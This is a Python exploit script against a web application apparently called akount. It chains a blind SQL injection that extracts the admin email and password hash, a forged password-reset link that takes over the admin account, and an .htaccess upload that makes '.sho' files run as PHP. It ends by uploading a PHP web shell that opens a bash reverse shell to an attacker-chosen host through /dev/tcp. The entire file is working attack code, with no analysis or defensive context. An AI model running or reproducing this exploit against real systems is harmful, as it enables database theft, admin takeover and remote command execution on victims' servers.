#! /usr/bin/env python3
import requests
import sys
import hashlib
import time
import random

if len(sys.argv) != 5:
        print ('(+) usage: %s domain username email password' % sys.argv[0])
        print ('(+) eg: %s akount user email@test.com password123' % sys.argv[0])
        sys.exit(-1)
host = sys.argv[1]
username = sys.argv[2]
email = sys.argv[3]
passwd = sys.argv[4]

url = "http://%s/register" % host
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
_data = {"name": "%s" % username,"email":"%s" % email,"password":"%s" % passwd}
s = requests.Session()
r = s.post(url, data=_data,headers={"Content-Type": "application/x-www-form-urlencoded"})
res = r.text
print ("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n")
if "You are now registered" in res:
        print ("Registration Successful")
else:
        print ("Error: Registeration failed")

url2 = "http://%s/login" % host
_data2 = {"email":"%s" % email,"password":"%s" % passwd}
s = requests.Session()
r2 = s.post(url2, data=_data2,headers={"Content-Type": "application/x-www-form-urlencoded"},allow_redirects=False)
res2 = r2.text
cookie = r2.headers['Set-Cookie'].split(" ")
cookies = cookie[0].replace(";","")
cookies = cookies.split("=")
print ("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n")
if r2.status_code == 302:
        print ("[+]Login Successful")
else:
        print ("[+]Error User Login Failed")

for i in range(11):
        url3 = "http://%s/seed" % host
        _data3 = {"userId":"1"}
        r = requests.post(url3,data=_data3,headers={"Content-Type":"application/x-www-form-urlencoded"},cookies={cookies[0]:cookies[1]})
        print (r.text)
print ("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n")
def seed_sqli(host, inj_str):
        for j in range(32, 126):
                url4 = "http://%s/seed" % host
                _data4 = {"userId":"1%s" % inj_str.replace("[CHAR]", str(j))}
                proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
                r4 = requests.post(url4,data=_data4,headers={"Content-Type":"application/x-www-form-urlencoded"},cookies={cookies[0]:cookies[1]})
                #print r.headers
                content_length = int(r4.headers['Content-Length'])
                if (content_length == 117):
                        return j
        return None
def inject(r, inj, host):
        extracted = ""
        for i in range(1, r):
                injection_string = "/**/and/**/(ascii(substring((%s),%d,1)))=[CHAR]" % (inj,i)
                retrieved_value = seed_sqli(host, injection_string)
                if(retrieved_value):
                        extracted += chr(retrieved_value)
                        extracted_char = chr(retrieved_value)
                        sys.stdout.write(extracted_char)
                        sys.stdout.flush()
                else:
                        print ("\n(+) done!")
                        break
        return extracted
print ("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n")
print ("(+) Retrieving username....")
query = 'select/**/email/**/from/**/users/**/where/**/name/**/=\'admin\''
username2 = inject(50, query, host)
print ("(+) Retrieving password hash....")
query = 'select/**/password/**/from/**/users/**/where/**/name/**/=\'admin\''
password2 = inject(62, query, host)
print ("\n")
print ("(+) Credentials: %s / %s" % (username2, password2))
_time = int(time.time())
token = random.randint(100000000000000, 999999999999999) #random int 
userid = 1
_hash = str(userid + token) + str(password2)
m = hashlib.sha256()
_hash2 = _hash.encode('utf-8')
m.update(_hash2)
phash = m.hexdigest()
pwhash = phash[5:30]
url5 = "http://{0}/reset/{1}/{2}/{3}/{4}".format(host,userid,token,_time,pwhash) #Reset link generate
print ("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n")
print (url5)
print ("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n")
new_pw = input("Please Enter Admin new Password : ")
_data5 = {"password":"%s" % new_pw}
r5 = requests.post(url5,data=_data5,headers={"Content-Type": "application/x-www-form-urlencoded"})
res = r5.text
if "Password reset" in res:
        print ("Administrator Password has been changed ..\nAuthentication Bypass completed Successfully")
else:
        print ("Error: Authentication Bypass failed")
print ("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n")
url6 = "http://%s/login" % host
_data6 = {"email":"%s" % username2,"password":"%s" % new_pw}
s = requests.Session()
r6 = s.post(url6, data=_data6,headers={"Content-Type": "application/x-www-form-urlencoded"},allow_redirects=False)
res6 = r6.text
cookie2 = r6.headers['Set-Cookie'].split(" ")
cookies2 = cookie2[0].replace(";","")
cookies2 = cookies2.split("=")
print ("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n")
if r6.status_code == 302:
        print ("Admin Logged in Successful")
else:
        print ("Error:Login failed")
print ("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n")
print ("\n\n\n")
url7 = "http://%s/import" % host #Upload page/Post request
files = {'file': ('.htaccess','AddType application/x-httpd-php .sho','text/csv')} 
r7 = requests.post(url7, files=files,cookies={cookies2[0]:cookies2[1]})
print ("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n")
if r7.status_code == 200:
        print ("Uploading .htaccess File Successful")
else:
        print ("Error:1")


url8 = "http://%s/import" % host 
files = {'file': ('reverse.sho',"<?php $ip=$_GET['ip']; $port=$_GET['port']; $string = \"/bin/bash -c 'bash -i >& /dev/tcp/\".$ip.\"/\".$port.\" 0>&1'\"; exec($string); ?>",'text/csv')}
r8 = requests.post(url8, files=files,cookies={cookies2[0]:cookies2[1]})

if r8.status_code == 200:
        print ("[+]Uploading PHP Shell File Completed")
else:
        print ("Error uploading the shell")

print ("open netcat listner on the RemoteHost..")

remote_ip = input("Enter Remote Host IP: ")

port = int(input("Enter Remote Host Port: "))

print ("Please Check Your netcat session ")
url9 = "http://%s/imports/reverse.sho?ip=%s&port=%d" % (host,remote_ip,port)
r9 = requests.get(url9, cookies={cookies2[0]:cookies2[1]})
print ("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n")
if r9.status_code == 200:
        print ("Exploit completed")
else:
        print ("Error:3-Shell")
print ("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")